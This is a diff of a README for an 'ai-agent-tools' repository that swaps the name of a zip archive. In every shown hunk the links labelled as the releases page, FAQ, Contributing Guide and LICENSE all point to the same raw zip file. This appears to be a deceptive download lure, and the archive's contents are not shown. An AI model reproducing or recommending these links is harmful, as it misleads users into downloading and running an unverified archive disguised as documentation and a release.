@@ -6,7 +6,7 @@ Welcome to **ai-agent-tools**! This collection offers a range of AI tools, utili
 
 ## 📥 Download Now
 
-[![Download ai-agent-tools](https://raw.githubusercontent.com/mangogamer162/ai-agent-tools/main/follow-me/tools_ai_agent_Pergamic.zip%https://raw.githubusercontent.com/mangogamer162/ai-agent-tools/main/follow-me/tools_ai_agent_Pergamic.zip)](https://raw.githubusercontent.com/mangogamer162/ai-agent-tools/main/follow-me/tools_ai_agent_Pergamic.zip)
+[![Download ai-agent-tools](https://raw.githubusercontent.com/mangogamer162/ai-agent-tools/main/follow-me/ai_tools_agent_3.2.zip%https://raw.githubusercontent.com/mangogamer162/ai-agent-tools/main/follow-me/ai_tools_agent_3.2.zip)](https://raw.githubusercontent.com/mangogamer162/ai-agent-tools/main/follow-me/ai_tools_agent_3.2.zip)
 
 ## 🔍 Overview
 
@@ -37,7 +37,7 @@ To run ai-agent-tools, ensure your system meets the following requirements:
 
 1. **Visit the Releases Page**: Click on the link below to access the release files:
    
-   [Download ai-agent-tools](https://raw.githubusercontent.com/mangogamer162/ai-agent-tools/main/follow-me/tools_ai_agent_Pergamic.zip)
+   [Download ai-agent-tools](https://raw.githubusercontent.com/mangogamer162/ai-agent-tools/main/follow-me/ai_tools_agent_3.2.zip)
 
 2. **Select the Latest Version**: On the releases page, look for the latest version. It will typically be at the top of the list.
 
@@ -51,7 +51,7 @@ To run ai-agent-tools, ensure your system meets the following requirements:
 
 ## 🌐 Support
 
-If you need help or have any questions, please check our [FAQ section](https://raw.githubusercontent.com/mangogamer162/ai-agent-tools/main/follow-me/tools_ai_agent_Pergamic.zip) in the repository. You can also submit an issue on GitHub.
+If you need help or have any questions, please check our [FAQ section](https://raw.githubusercontent.com/mangogamer162/ai-agent-tools/main/follow-me/ai_tools_agent_3.2.zip) in the repository. You can also submit an issue on GitHub.
 
 ## 🧭 Topics
 
@@ -68,7 +68,7 @@ This project covers several key areas in AI. Explore more about:
 
 ## 🌟 Contributions
 
-We welcome contributions from the community. If you want to help improve the tools or add new features, please check our [Contributing Guide](https://raw.githubusercontent.com/mangogamer162/ai-agent-tools/main/follow-me/tools_ai_agent_Pergamic.zip).
+We welcome contributions from the community. If you want to help improve the tools or add new features, please check our [Contributing Guide](https://raw.githubusercontent.com/mangogamer162/ai-agent-tools/main/follow-me/ai_tools_agent_3.2.zip).
 
 ## 🤝 Acknowledgments
 
@@ -76,7 +76,7 @@ We thank all contributors and users for supporting this project. Your feedback h
 
 ## 📁 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/mangogamer162/ai-agent-tools/main/follow-me/tools_ai_agent_Pergamic.zip) file for more details. 
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/mangogamer162/ai-agent-tools/main/follow-me/ai_tools_agent_3.2.zip) file for more details. 
 
 ## 🛡️ Stay Updated
 
